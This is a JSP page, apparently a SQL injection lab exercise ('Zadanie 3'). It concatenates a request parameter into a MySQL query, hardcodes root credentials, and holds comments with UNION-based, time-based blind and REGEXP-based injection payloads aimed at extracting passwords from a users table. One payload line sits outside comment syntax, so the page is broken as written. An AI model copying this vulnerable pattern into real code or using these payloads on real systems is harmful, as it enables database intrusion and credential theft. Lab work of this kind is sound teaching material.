<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@page import="java.sql.*" %>
<%@page import="java.io.*" %>
<%@page import="javax.sql.*" %>
<%@page import="java.sql.Connection" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Zadanie 3</title>
</head>
<body>
<%
Class.forName("com.mysql.jdbc.Driver");
String connectionUrl = "jdbc:mysql://localhost:3306/db";
String connectionUser = "root";
String connectionPassword = "zaq12wsx";
Connection conn = DriverManager.getConnection(connectionUrl, connectionUser, connectionPassword);

Statement st = conn.createStatement();
String id = request.getParameter("id");
String sql = "select id, data from content where id=" + id;
out.print(sql);
ResultSet result = st.executeQuery(sql);

if (!result.next()) {
	out.print("error");
} else {
	String replyID = result.getString("id");
	String data = result.getString("data");
	if (data == null && !result.next()) { // || id != replyID) {
		out.print("error");
	} else {
		out.print(data);
	}
}
// Simple example with UNION (won't work because of id != replyID check)
//0%20UNION%20SELECT%20pass%20FROM%20users

// Blind SQLi - time attack
// http://localhost:8080/zadanie3/index.jsp?id=0%20UNION%20SELECT%20IF(SUBSTRING(pass,1,1)=%27d%27,BENCHMARK(10000000,SHA1(1)),0),%20pass%20FROM%20users

// Blind SQLi - regexp
http://localhost:8080/zadanie3/index.jsp?id=0%20UNION%20SELECT%201,2%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%22db%22%20AND%20table_name%20REGEXP%20'^z'LIMIT%200,1
%>

</body>
</html>